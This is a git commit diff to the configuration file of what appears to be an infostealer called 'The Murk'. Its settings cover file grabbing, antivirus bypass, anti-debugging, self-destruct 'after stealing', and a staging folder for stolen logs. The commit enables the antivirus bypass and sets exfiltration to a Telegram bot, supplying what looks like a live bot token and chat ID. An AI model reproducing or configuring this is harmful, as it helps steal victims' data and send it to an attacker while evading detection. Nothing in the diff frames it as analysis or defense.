168c36be8b2ee39262a84f57e00a91a688e439d0
Nguyễn Cao Nguyên <nguyencaonguyen0944322545@gmail.com>
2024-02-04 00:48:11 +0700

    The Story begin.

--- The Murk/preferences/config.py
+++ The Murk/preferences/config.py
@@ -1,13 +1,13 @@
 class config:
     enableFileGrabber = False #enable file grabber
     oneStart = False #enable this if you want logs to come only from unique computers
-    id = 19380887093145377305 #unique id for oneStart
-    avbypass = False #enable antiviruses bypass
+    id = 13082007170220070000 #unique id for oneStart
+    avbypass = True #enable antiviruses bypass
     selfDestruct = False #deletes itself after stealing
     debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
-    pathToLogs = "\\AppData\\Local\\Temp\\{1116-3289-5081-2976}" #path where will be stored logs before sending (from user dir)
+    pathToLogs = "\\AppData\\Local\\Temp\\{923462db-6578-4ed1-beaf-f03d9860d883}" #path where will be stored logs before sending (from user dir)
 
-    sendData = [0,"",""]# You can write your address for sending logs here
+    sendData = [1, "6875758020:AAGOUZ9iP8h45W5_OLQQPvd2_NwZKy7Zeq4", "6500557225"]# You can write your address for sending logs here
 
     #example for Discord [0, "url of your WebHook", "null"]
     #example for Telegram [1, "HTTPAPI that you got from botFather", "your chat ID"]
